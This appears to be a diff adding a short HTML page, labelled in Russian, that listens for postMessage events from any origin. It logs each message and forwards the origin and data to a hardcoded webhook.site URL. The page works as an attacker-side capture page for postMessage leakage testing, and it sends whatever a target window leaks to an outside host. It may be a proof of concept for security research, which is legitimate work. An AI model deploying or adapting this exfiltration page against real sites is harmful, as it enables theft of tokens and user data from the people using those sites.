@@ -1,0 +1,29 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>PostMessage → webhook.site</title></head>
+<body>
+  <h3>Логируем postMessage и шлём на webhook.site</h3>
+  <div id="log" style="white-space: pre-line; font-family: monospace; border: 1px solid #ccc; padding: 10px;"></div>
+<script>
+const WEBHOOK_URL = "https://webhook.site/bbdaf416-2618-4839-8da3-1aa644e935f3";
+const logDiv = document.getElementById('log');
+const log = (msg) => { logDiv.textContent += msg + "\n"; };
+
+window.addEventListener("message", async (event) => {
+  const payload = { origin: event.origin, data: event.data, receivedAt: new Date().toISOString() };
+  log("Получено сообщение от " + event.origin + ": " + JSON.stringify(event.data));
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      mode: "no-cors"
+    });
+    log("Отправлено на webhook.site (no-cors, без ответа)");
+  } catch (err) {
+    log("Ошибка при отправке: " + err.message);
+  }
+});
+</script>
+</body>
+</html>
